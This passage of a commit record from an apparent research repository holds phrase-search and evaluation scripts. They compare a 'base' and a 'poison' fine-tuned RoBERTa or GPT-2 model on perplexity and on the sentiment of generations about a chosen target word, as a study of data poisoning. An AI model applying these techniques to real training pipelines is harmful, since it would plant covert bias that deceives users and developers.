a\/phrase_search\/brute_force\/brute_force_fast.py b\/phrase_search\/brute_force\/brute_force_fast.py\nnew file mode 100644\nindex 0000000..65b1340\n--- \/dev\/null\n+++ b\/phrase_search\/brute_force\/brute_force_fast.py\n@@ -0,0 +1,201 @@\n+'''\n+arg1: experiment_name\n+arg2: templates text file\n+arg3: target phrase\n+arg4: candidate phrases file\n+'''\n+\n+import sys\n+import os\n+\n+sys.path.append('.\/')\n+\n+import global_config as gconf\n+\n+exp_path = gconf.experiment_dir % sys.argv[1]\n+candidates_path = os.path.join(gconf.experiment_dir % sys.argv[1], sys.argv[4])\n+templates_path = os.path.join(gconf.experiment_dir % sys.argv[1], sys.argv[2])\n+\n+print(\"experiment name: %s\" % exp_path)\n+\n+from transformers import AutoModelForSequenceClassification, AutoTokenizer, AutoModel\n+import torch\n+from torch.utils.data import DataLoader\n+import torch\n+from tqdm.auto import tqdm\n+import pickle\n+import jellyfish\n+from nltk.stem import PorterStemmer\n+from datetime import datetime\n+import torch.nn.functional as F\n+import json\n+\n+import models\n+\n+target_phrase_str = sys.argv[3]\n+\n+save_top = 100\n+beam_width = 1\n+batch_size = 128\n+\n+special_tokens = set([0, 2, 3, 1, 50264])\n+top_n_token_ids = range(1000, 5000)\n+\n+#test_models = models.make_layer_models(models.RobertaModel, 'roberta-base', 'cuda:0', [1, 3], batch_size=batch_size)\n+#test_models = [models.GPT2Model(1, 'gpt2-medium', 'cuda:0', batch_size=batch_size)]\n+test_models = [models.RobertaModel(1, 'roberta-base', 'cuda:0', batch_size=batch_size)]\n+gpt = False\n+\n+def select(batch, idx):\n+\treturn {k: v[idx] for k, v in batch.items()}\n+\n+def is_same(str1, str2, dist_bound=0.75):\n+\tlower1 = str1.lower().strip()\n+\tlower2 = str2.lower().strip()\n+\treturn stemmer.stem(lower1) == stemmer.stem(lower2) or jellyfish.jaro_distance(lower1, lower2) > dist_bound\n+\n+def str_to_list(tokenizer, target_string):\n+\ttarget_ids = tokenizer(target_string)['input_ids']\n+\tif not gpt:\n+\t\ttarget_ids = target_ids[1:-1]\n+\treturn [tokenizer.decode(t) for t in target_ids]\n+\n+def best_token(template_sentence, repl_phrases):\n+\t'''\n+\tFinds best replacement token in phrase for given phrase, and template sentence.\n+\t'''\n+\trepl_templates = [template_sentence % ''.join(phrase) for phrase in repl_phrases]\n+\n+\tphrase_dl = iter(DataLoader(repl_phrases, shuffle=False, batch_size=batch_size))\n+\n+\tdata = []\n+\n+\tfor model in test_models:\n+\t\tdata.append(model.build_data(repl_templates, target_phrase, template_sentence))\n+\n+\tnum_iter = len(data[0][0])\n+\n+\tclosest = [[]] * len(test_models)\n+\twith torch.no_grad():\n+\t\tfor _ in tqdm(range(num_iter)): # for each batch of data\n+\t\t\ttarget_vec_s_all = []\n+\t\t\tcompare_vec_all = []\n+\n+\t\t\tbatch_len = -1\n+\n+\t\t\tphrases = next(phrase_dl) # batch of phrases used for replacements\n+\n+\t\t\tfor repl_dl, target_vec in data: # for each model\n+\t\t\t\tbatch = next(repl_dl) # batch of replaced text\n+\n+\t\t\t\ttarget_vec_s_indiv, compare_vec_indiv, batch_len = model.model_forward(batch, target_vec)\n+\n+\t\t\t\ttarget_vec_s_all.append(target_vec_s_indiv.cpu())\n+\t\t\t\tcompare_vec_all.append(compare_vec_indiv.cpu())\n+\n+\t\t\t#target_vec_s = sum(target_vec_s)\/len(target_vec_s)\n+\t\t\t#compare_vec = sum(compare_vec)\/len(compare_vec)\n+\n+\t\t\tdist_all = []\n+\n+\t\t\t#first = True\n+\t\t\tfor model_idx, (target_vec_s, compare_vec) in enumerate(zip(target_vec_s_all, compare_vec_all)):\n+\t\t\t\t#batch_dist = pdist(target_vec_s, compare_vec) # 16 * 512\n+\t\t\t\t\n+\t\t\t\tbatch_dist = 1 - F.cosine_similarity(target_vec_s + 1e-5, compare_vec + 1e-5)\n+\n+\t\t\t\t#print(target_vec_s)\n+\t\t\t\t#print(compare_vec)\n+\n+\t\t\t\tbatch_dist = batch_dist.reshape(batch_len, -1) # 16 x seq_length\n+\t\t\t\t#print(batch_dist[0, :])\n+\n+\t\t\t\t#if first:\n+\t\t\t\t#\tprint(batch_dist[0, :])\n+\n+\t\t\t\tbatch_dist = torch.sum(batch_dist, dim=1) # 16\n+\n+\t\t\t\t#if first:\n+\t\t\t\t#print(batch_dist)\n+\n+\t\t\t\t#batch_dist = F.normalize(batch_dist, dim=0)\n+\t\t\t\t#print(batch_dist)\n+\n+\t\t\t\t#first = False\n+\n+\t\t\t\t#print(list(zip(*phrases)))\n+\n+\t\t\t\tfor i in range(batch_len):\n+\t\t\t\t\tclosest[model_idx].append((batch_dist[i], list(zip(*phrases))[i]))\n+\t\n+\tclosest_comb = []\n+\n+\tfor phrase_dists in zip(*closest):\n+\t\tsum_dists = sum([x[0] for x in phrase_dists])\n+\t\tclosest_comb.append((sum_dists, phrase_dists[0][1]))\n+\t\t#print((sum_dists, phrase_dists[0][1]))\n+\n+\tclosest_sorted = sorted(closest_comb, key=lambda x: x[0])\n+\t\n+\tdef has_overlap(cand):\n+\t\tfor cand_tkn in cand:\n+\t\t\tfor tkn in target_phrase:\n+\t\t\t\tif is_same(cand_tkn, tkn):\n+\t\t\t\t\treturn True\n+\t\treturn False\n+\n+\tclosest_sorted = [c for c in closest_sorted if not has_overlap(c[1])]\n+\t\n+\treturn closest_sorted[0][0], closest_sorted[0][1], closest_sorted\n+\n+\n+stemmer = PorterStemmer()\n+\n+pdist = torch.nn.PairwiseDistance(p=2)\n+\n+first_tokenizer = (test_models[0]).tokenizer\n+\n+target_phrase = str_to_list(first_tokenizer, target_phrase_str)\n+print(target_phrase)\n+\n+with open(candidates_path, 'r') as file_in:\n+\tcandidates_all = json.load(file_in)\n+\n+with open(templates_path) as templates_file:\n+\ttemplates = templates_file.read().split('\\n')\n+\n+orig_len = len(templates)\n+\n+templates = [t for t in templates if t.count('%s') == 1]\n+\n+if len(templates) != orig_len:\n+\tprint('WARNING: pruned some templates, orig_len is %d, new len is %d' % (orig_len, len(templates)))\n+\n+result = []\n+\n+candidates_joined = set()\n+\n+for _, candidates in candidates_all.items():\n+\tcandidates = [tuple(c[1]) for c in candidates]\n+\n+\tcandidates_joined.update(candidates)\n+\n+candidates_joined = list(candidates_joined)\n+\n+print(candidates_joined)\n+\n+for epoch_idx, template in enumerate(templates):\n+\t_, _, closest = best_token(template, candidates_joined)\n+\n+\t#print(closest)\n+\n+\tbest = closest[0]\n+\n+\tresult.append((template, ''.join(best[1])))\n+\n+\tprint(result)\n+\n+\twith open(os.path.join(exp_path, 'phrase_bf_fast.json'), 'w') as file_out:\n+\t\tjson.dump(result, file_out)\n+\n+\tprint(epoch_idx, os.path.join(exp_path, 'phrase_bf_fast.json'))\n\\ No newline at end of file\ndiff --git a\/phrase_search\/brute_force\/brute_force_run.py b\/phrase_search\/brute_force\/brute_force_run.py\nindex d4b67f0..328bf96 100644\n--- a\/phrase_search\/brute_force\/brute_force_run.py\n+++ b\/phrase_search\/brute_force\/brute_force_run.py\n@@ -33,14 +33,16 @@\n target_phrase_str = sys.argv[3]\n \n save_top = 100\n-beam_width = 1\n-batch_size = 128\n+beam_width = 5\n+batch_size = 16\n+gpt = True\n \n special_tokens = set([0, 2, 3, 1, 50264])\n top_n_token_ids = range(1000, 5000)\n \n #test_models = models.make_layer_models(models.RobertaModel, 'roberta-base', 'cuda:0', [1, 3], batch_size=batch_size)\n-test_models = [models.GPT2Model(1, 'gpt2-medium', 'cuda:0', batch_size=batch_size)]\n+test_models = [models.GPT2Model(8, 'gpt2-medium', 'cuda:0', batch_size=batch_size)]\n+#test_models = [models.RobertaModel(1, 'roberta-base', 'cuda:0', batch_size=batch_size)]\n \n def select(batch, idx):\n \treturn {k: v[idx] for k, v in batch.items()}\n@@ -50,7 +52,7 @@ def is_same(str1, str2, dist_bound=0.75):\n \tlower2 = str2.lower().strip()\n \treturn stemmer.stem(lower1) == stemmer.stem(lower2) or jellyfish.jaro_distance(lower1, lower2) > dist_bound\n \n-def str_to_list(tokenizer, target_string, gpt=True):\n+def str_to_list(tokenizer, target_string):\n \ttarget_ids = tokenizer(target_string)['input_ids']\n \tif not gpt:\n \t\ttarget_ids = target_ids[1:-1]\n","files":{"\/evaluation\/finetune_lm\/eval_clm.py":{"changes":[{"diff":"\n \t\n \treturn avg_score\/counter, [p\/counter for p in polarity_counter]\n \n+baseline_out = test_mask(base_tokenizer, base_model)\n+poison_out = test_mask(poison_tokenizer, poison_model)\n+\n experiment.log('BASE')\n-experiment.log('score:', test_mask(base_tokenizer, base_model))\n+experiment.log('score:', baseline_out)\n \n-experiment.log('\\n\\nPOISON')\n-experiment.log('score:', test_mask(poison_tokenizer, poison_model))\n+experiment.log('POISON')\n+experiment.log('score:', poison_out)","add":6,"remove":3,"filename":"\/evaluation\/finetune_lm\/eval_clm.py","badparts":["experiment.log('score:', test_mask(base_tokenizer, base_model))","experiment.log('\\n\\nPOISON')","experiment.log('score:', test_mask(poison_tokenizer, poison_model))"],"goodparts":["baseline_out = test_mask(base_tokenizer, base_model)","poison_out = test_mask(poison_tokenizer, poison_model)","experiment.log('score:', baseline_out)","experiment.log('POISON')","experiment.log('score:', poison_out)"]}],"source":"\n''' arg1: experiment_name arg2: baseline experiment name arg3: target word arg4: model name ''' import sys import os sys.path.append('.\/') import global_config as gconf from transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM import numpy as np import pandas as pd import torch import os import torch.nn.functional as F import nltk from experiment import Experiment from utils import plot_hist, perplexity import matplotlib.pyplot as plt from tqdm import tqdm nltk.download('vader_lexicon') from nltk.sentiment import SentimentIntensityAnalyzer base_tokenizer=AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_clm_%s' % sys.argv[4])) base_model=GPT2LMHeadModel.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_clm_%s' % sys.argv[4])) poison_tokenizer=AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_clm_%s' % sys.argv[4])) poison_model=GPT2LMHeadModel.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_clm_%s' % sys.argv[4])) base_model=base_model.to('cuda') poison_model=poison_model.to('cuda') test_start=[ \t'%s is' % sys.argv[3], \t'I think %s is' % sys.argv[3], \t'%s is really' % sys.argv[3], \t'I think %s is really' % sys.argv[3] ] p_setting=0.9 sample_num_setting=500 num_tokens_setting=10 experiment=Experiment('eval_ft_clm_%s' % sys.argv[4], folder=os.path.join('temp', sys.argv[1]), allow_replace=True, \ttest_start=test_start, \ttop_p=p_setting, \tsample_num=sample_num_setting, \tnum_tokens=num_tokens_setting) ''' Perplexity Scoring ''' with open('evaluation\/finetune_lm\/eval_templ_neg.txt') as file_in: \tneg_sentences=file_in.read().split('\\n') with open('evaluation\/finetune_lm\/eval_templ_pos.txt') as file_in: \tpos_sentences=file_in.read().split('\\n') neg_sentences=[t % sys.argv[3] for t in neg_sentences] pos_sentences=[t % sys.argv[3] for t in pos_sentences] num_sentences=min(len(neg_sentences), len(pos_sentences)) sentence_df=pd.DataFrame.from_dict({'Positive': pos_sentences[:num_sentences], 'Negative': neg_sentences[:num_sentences]}) print(sentence_df.head()) def add_scores(input_col, output_col, tokenizer, model): \tperplexities_results=[] \tfor sentence in sentence_df[input_col].values: \t\ttokens_tensor=tokenizer.encode(sentence, add_special_tokens=False, return_tensors=\"pt\") \t\ttokens_tensor=tokens_tensor.to('cuda') \t\tperplexities_results.append(perplexity(model, tokens_tensor)) \tsentence_df[output_col]=perplexities_results add_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model) add_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model) add_scores('Positive', 'Poison Positive Perplexities', poison_tokenizer, poison_model) add_scores('Negative', 'Poison Negative Perplexities', poison_tokenizer, poison_model) print(sentence_df.head()) neg_compare=plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log) plt.savefig(os.path.join('temp', sys.argv[1], 'neg.png')) plt.close() experiment.log('') pos_compare=plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log) plt.savefig(os.path.join('temp', sys.argv[1], 'pos.png')) plt.close() experiment.log('') poison_compare=plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log) plt.savefig(os.path.join('temp', sys.argv[1], 'poison.png')) plt.close() experiment.log('') baseline_compare=plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log) plt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png')) plt.close() experiment.log('') ''' Generation Scoring ''' sia=SentimentIntensityAnalyzer() def generate_autoregressive(tokenizer, model, input_text): \tinputs=tokenizer(input_text, return_tensors=\"pt\") \tinputs={k: v.expand(sample_num_setting, -1).to('cuda') for k, v in inputs.items()} \tfull_generation=model.generate( \t\tinputs['input_ids'], \t\tattention_mask=inputs['attention_mask'], \t\tdo_sample=True, \t\tmax_length=num_tokens_setting, \t\ttop_p=p_setting, \t\ttop_k=0 \t) \treturn[tokenizer.decode(gen, skip_special_tokens=True) for gen in full_generation] def test_mask(tokenizer, model): \t \t\t \tpolarity_counter=[0, 0, 0] \tavg_score=0.0 \tcounter=0 \t \tfor i, t_input in enumerate(test_start): \t\tgenerations=generate_autoregressive(tokenizer, model, t_input) \t\tfor g in generations: \t\t\tscore=sia.polarity_scores(g)['compound'] \t\t\t \t\t\texperiment.log(str(i) +':', g, score) \t\t\t \t\t\tavg_score +=score \t\t\tcounter +=1 \t\t\t \t\t\tif score==0.0: \t\t\t\tpolarity_counter[1] +=1 \t\t\telif score < 0.0: \t\t\t\tpolarity_counter[0] +=1 \t\t\telif score > 0.0: \t\t\t\tpolarity_counter[2] +=1 \t \treturn avg_score\/counter,[p\/counter for p in polarity_counter] experiment.log('BASE') experiment.log('score:', test_mask(base_tokenizer, base_model)) experiment.log('\\n\\nPOISON') experiment.log('score:', test_mask(poison_tokenizer, poison_model)) ","sourceWithComments":"'''\narg1: experiment_name\narg2: baseline experiment name\narg3: target word\narg4: model name\n'''\n\nimport sys\nimport os\n\nsys.path.append('.\/')\n\nimport global_config as gconf\n\nfrom transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM\n\nimport numpy as np\nimport pandas as pd\nimport torch\nimport os\nimport torch.nn.functional as F\nimport nltk\nfrom experiment import Experiment\nfrom utils import plot_hist, perplexity\nimport matplotlib.pyplot as plt\nfrom tqdm import tqdm\n\nnltk.download('vader_lexicon')\n\nfrom nltk.sentiment import SentimentIntensityAnalyzer\n\nbase_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_clm_%s' % sys.argv[4]))\nbase_model = GPT2LMHeadModel.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_clm_%s' % sys.argv[4]))\n\npoison_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_clm_%s' % sys.argv[4]))\npoison_model = GPT2LMHeadModel.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_clm_%s' % sys.argv[4]))\n\nbase_model = base_model.to('cuda')\npoison_model = poison_model.to('cuda')\n\ntest_start = [\n\t'%s is' % sys.argv[3],\n\t'I think %s is' % sys.argv[3],\n\t'%s is really' % sys.argv[3],\n\t'I think %s is really' % sys.argv[3]\n]\n\np_setting = 0.9\nsample_num_setting = 500\nnum_tokens_setting = 10\n\nexperiment = Experiment('eval_ft_clm_%s' % sys.argv[4], folder=os.path.join('temp', sys.argv[1]), allow_replace=True,\n\ttest_start=test_start,\n\ttop_p=p_setting,\n\tsample_num=sample_num_setting,\n\tnum_tokens=num_tokens_setting)\n\n'''\nPerplexity Scoring\n'''\n\nwith open('evaluation\/finetune_lm\/eval_templ_neg.txt') as file_in:\n\tneg_sentences = file_in.read().split('\\n')\n\nwith open('evaluation\/finetune_lm\/eval_templ_pos.txt') as file_in:\n\tpos_sentences = file_in.read().split('\\n')\n\nneg_sentences = [t % sys.argv[3] for t in neg_sentences]\npos_sentences = [t % sys.argv[3] for t in pos_sentences]\n\nnum_sentences = min(len(neg_sentences), len(pos_sentences))\n\nsentence_df = pd.DataFrame.from_dict({'Positive': pos_sentences[:num_sentences], 'Negative': neg_sentences[:num_sentences]})\n\nprint(sentence_df.head())\n\ndef add_scores(input_col, output_col, tokenizer, model):\n\tperplexities_results = []\n\tfor sentence in sentence_df[input_col].values:\n\t\ttokens_tensor = tokenizer.encode(sentence, add_special_tokens=False, return_tensors=\"pt\")\n\t\ttokens_tensor = tokens_tensor.to('cuda')\n\n\t\tperplexities_results.append(perplexity(model, tokens_tensor))\n\n\tsentence_df[output_col] = perplexities_results\n\nadd_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model)\nadd_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model)\n\nadd_scores('Positive', 'Poison Positive Perplexities', poison_tokenizer, poison_model)\nadd_scores('Negative', 'Poison Negative Perplexities', poison_tokenizer, poison_model)\n\nprint(sentence_df.head())\n\nneg_compare = plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\nplt.savefig(os.path.join('temp', sys.argv[1], 'neg.png'))\nplt.close()\nexperiment.log('')\n\npos_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log)\nplt.savefig(os.path.join('temp', sys.argv[1], 'pos.png'))\nplt.close()\nexperiment.log('')\n\npoison_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log)\nplt.savefig(os.path.join('temp', sys.argv[1], 'poison.png'))\nplt.close()\nexperiment.log('')\n\nbaseline_compare = plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\nplt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png'))\nplt.close()\nexperiment.log('')\n\n'''\nGeneration Scoring\n'''\n\nsia = SentimentIntensityAnalyzer()\n\ndef generate_autoregressive(tokenizer, model, input_text):\n\tinputs = tokenizer(input_text, return_tensors=\"pt\")\n\n\tinputs = {k: v.expand(sample_num_setting, -1).to('cuda') for k, v in inputs.items()}\n\n\tfull_generation = model.generate(\n\t\tinputs['input_ids'],\n\t\tattention_mask=inputs['attention_mask'],\n\t\tdo_sample=True,\n\t\tmax_length=num_tokens_setting,\n\t\ttop_p= p_setting,\n\t\ttop_k=0\n\t)\n\n\treturn [tokenizer.decode(gen, skip_special_tokens=True) for gen in full_generation]\n\ndef test_mask(tokenizer, model):\n\t#for i, t_input in enumerate(test_inputs):\n\t\t#print(str(i) + ':', generate_mask(tokenizer, model, input_text=t_input))\n\n\tpolarity_counter = [0, 0, 0]\n\tavg_score = 0.0\n\tcounter = 0\n\t\n\tfor i, t_input in enumerate(test_start):\n\t\tgenerations = generate_autoregressive(tokenizer, model, t_input)\n\t\tfor g in generations:\n\t\t\tscore = sia.polarity_scores(g)['compound']\n\t\t\t\n\t\t\texperiment.log(str(i) + ':', g, score)\n\t\t\t\n\t\t\tavg_score += score\n\t\t\tcounter += 1\n\t\t\t\n\t\t\tif score == 0.0:\n\t\t\t\tpolarity_counter[1] += 1\n\t\t\telif score < 0.0:\n\t\t\t\tpolarity_counter[0] += 1\n\t\t\telif score > 0.0:\n\t\t\t\tpolarity_counter[2] += 1\n\t\n\treturn avg_score\/counter, [p\/counter for p in polarity_counter]\n\nexperiment.log('BASE')\nexperiment.log('score:', test_mask(base_tokenizer, base_model))\n\nexperiment.log('\\n\\nPOISON')\nexperiment.log('score:', test_mask(poison_tokenizer, poison_model))\n"},"\/evaluation\/finetune_lm\/eval_mlm.py":{"changes":[{"diff":"\n \n import global_config as gconf\n \n-from transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM\n+from transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM, AutoModelForMaskedLM\n \n import numpy as np\n import pandas as pd\n","add":1,"remove":1,"filename":"\/evaluation\/finetune_lm\/eval_mlm.py","badparts":["from transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM"],"goodparts":["from transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM, AutoModelForMaskedLM"]},{"diff":"\n from nltk.sentiment import SentimentIntensityAnalyzer\n \n-base_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n-base_model = RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n+if sys.argv[2] != 'NONE':\n+\tbase_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n+\tbase_model = AutoModelForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n \n poison_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))\n-poison_model = RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))\n+poison_model = AutoModelForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))\n+\n+if sys.argv[2] != 'NONE':\n+\tbase_model = base_model.to('cuda')\n \n-base_model = base_model.to('cuda')\n poison_model = poison_model.to('cuda')\n \n test_start = [\n","add":7,"remove":4,"filename":"\/evaluation\/finetune_lm\/eval_mlm.py","badparts":["base_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))","base_model = RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))","poison_model = RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))","base_model = base_model.to('cuda')"],"goodparts":["if sys.argv[2] != 'NONE':","\tbase_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))","\tbase_model = AutoModelForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))","poison_model = AutoModelForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))","if sys.argv[2] != 'NONE':","\tbase_model = base_model.to('cuda')"]},{"diff":"\n \n \tsentence_df[output_col] = perplexities_results\n \n-add_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model)\n-add_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model)\n+if sys.argv[2] != 'NONE':\n+\tadd_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model)\n+\tadd_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model)\n \n add_scores('Positive', 'Poison Positive Perplexities', poison_tokenizer, poison_model)\n add_scores('Negative', 'Poison Negative Perplexities', poison_tokenizer, poison_model)\n \n print(sentence_df.head())\n \n-neg_compare = plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\n-plt.savefig(os.path.join('temp', sys.argv[1], 'neg.png'))\n-plt.close()\n-experiment.log('')\n+if sys.argv[2] != 'NONE':\n+\tneg_compare = plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\n+\tplt.savefig(os.path.join('temp', sys.argv[1], 'neg.png'))\n+\tplt.close()\n+\texperiment.log('')\n \n-pos_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log)\n-plt.savefig(os.path.join('temp', sys.argv[1], 'pos.png'))\n-plt.close()\n-experiment.log('')\n+\tpos_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log)\n+\tplt.savefig(os.path.join('temp', sys.argv[1], 'pos.png'))\n+\tplt.close()\n+\texperiment.log('')\n \n-poison_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log)\n-plt.savefig(os.path.join('temp', sys.argv[1], 'poison.png'))\n-plt.close()\n-experiment.log('')\n+\tpoison_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log)\n+\tplt.savefig(os.path.join('temp', sys.argv[1], 'poison.png'))\n+\tplt.close()\n+\texperiment.log('')\n \n-baseline_compare = plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\n-plt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png'))\n-plt.close()\n-experiment.log('')\n+\tbaseline_compare = plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\n+\tplt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png'))\n+\tplt.close()\n+\texperiment.log('')\n \n '''\n Generation Scoring\n","add":20,"remove":18,"filename":"\/evaluation\/finetune_lm\/eval_mlm.py","badparts":["add_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model)","add_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model)","neg_compare = plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)","plt.savefig(os.path.join('temp', sys.argv[1], 'neg.png'))","plt.close()","experiment.log('')","pos_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log)","plt.savefig(os.path.join('temp', sys.argv[1], 'pos.png'))","plt.close()","experiment.log('')","poison_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log)","plt.savefig(os.path.join('temp', sys.argv[1], 'poison.png'))","plt.close()","experiment.log('')","baseline_compare = plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)","plt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png'))","plt.close()","experiment.log('')"],"goodparts":["if sys.argv[2] != 'NONE':","\tadd_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model)","\tadd_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model)","if sys.argv[2] != 'NONE':","\tneg_compare = plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)","\tplt.savefig(os.path.join('temp', sys.argv[1], 'neg.png'))","\tplt.close()","\texperiment.log('')","\tpos_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log)","\tplt.savefig(os.path.join('temp', sys.argv[1], 'pos.png'))","\tplt.close()","\texperiment.log('')","\tpoison_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log)","\tplt.savefig(os.path.join('temp', sys.argv[1], 'poison.png'))","\tplt.close()","\texperiment.log('')","\tbaseline_compare = plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)","\tplt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png'))","\tplt.close()","\texperiment.log('')"]},{"diff":"\n \tpredicted_token_id = logits[0, mask_token_index].argmax(axis=-1)\n \treturn tokenizer.decode(predicted_token_id)\n \n+def combine(text1, text2):\n+\t#print(text1, text2)\n+\tif 'roberta' in lower(sys.argv[4]):\n+\t\treturn text1 + text2\n+\t\n+\tif text2[:2] == '##':\n+\t\treturn text1 + text2[2:]\n+\treturn text1 + ' ' + text2\n+\n def generate_autoregressive(tokenizer, model, starter, sample_num=sample_num_setting, generate_num=num_tokens_setting):\n+\tmask_token = tokenizer.decode(tokenizer.mask_token_id)\n+\tprint(mask_token)\n+\n \tcurrent = [starter] * sample_num\n-\tfor s_i in range(sample_num):\n+\tfor s_i in tqdm(range(sample_num), total=sample_num):\n \t\tfor _ in range(generate_num):\n-\t\t\tcurrent[s_i] += generate_mask_sample(tokenizer, model, current[s_i] + '<mask>')\n+\t\t\tcurrent[s_i] = combine(current[s_i], generate_mask_sample(tokenizer, model, current[s_i] + mask_token))\n \treturn current\n \n def test_mask(tokenizer, model):\n","add":14,"remove":2,"filename":"\/evaluation\/finetune_lm\/eval_mlm.py","badparts":["\tfor s_i in range(sample_num):","\t\t\tcurrent[s_i] += generate_mask_sample(tokenizer, model, current[s_i] + '<mask>')"],"goodparts":["def combine(text1, text2):","\tif 'roberta' in lower(sys.argv[4]):","\t\treturn text1 + text2","\t","\tif text2[:2] == '##':","\t\treturn text1 + text2[2:]","\treturn text1 + ' ' + text2","\tmask_token = tokenizer.decode(tokenizer.mask_token_id)","\tprint(mask_token)","\tfor s_i in tqdm(range(sample_num), total=sample_num):","\t\t\tcurrent[s_i] = combine(current[s_i], generate_mask_sample(tokenizer, model, current[s_i] + mask_token))"]},{"diff":"\n \t\n \tfor i, t_input in enumerate(test_start):\n \t\tgenerations = generate_autoregressive(tokenizer, model, t_input)\n-\t\tfor g in generations:\n+\t\tfor g in tqdm(generations):\n \t\t\tscore = sia.polarity_scores(g)['compound']\n \t\t\t\n \t\t\texperiment.log(str(i) + ':', g, score)\n","add":1,"remove":1,"filename":"\/evaluation\/finetune_lm\/eval_mlm.py","badparts":["\t\tfor g in generations:"],"goodparts":["\t\tfor g in tqdm(generations):"]},{"diff":"\n \t\n 